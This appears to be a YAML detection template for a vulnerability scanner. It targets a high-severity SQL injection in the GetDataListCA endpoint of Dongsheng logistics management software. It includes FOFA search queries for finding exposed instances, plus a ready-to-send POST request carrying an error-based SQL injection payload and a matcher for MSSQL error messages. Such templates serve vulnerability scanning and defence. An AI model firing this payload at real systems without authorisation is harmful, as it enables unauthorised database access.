id: dongshengwuliu-getdatalistca-sqli

info:
  name: 东胜物流软件GetDataListCA接口存在SQL注⼊漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理,仓库管理,运输管理等多种功能于一体的物流管理软件。东胜物流软件GetDataListCA接口存在SQL注⼊漏洞。
    fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" ||body="dongshengsoft" || body="theme/dhtmlxcombo.css"
  reference:
    - https://mp.weixin.qq.com/s/SMHfx6LW2o505t4K5mzgNw
  tags: dongshengwuliu,sqli
  created: 2025/09/09

rules:
  r0:
    request:
      method: POST
      path: /MvcShipping/MsCwGenlegAccitems/GetDataListCA
      body: |
        PACCGID=-1')and 1<@@VERSION--
    expression: response.status == 500 && response.body.bcontains(b"nvarchar") && response.body.bcontains(b"Microsoft SQL Server")
expression: r0()
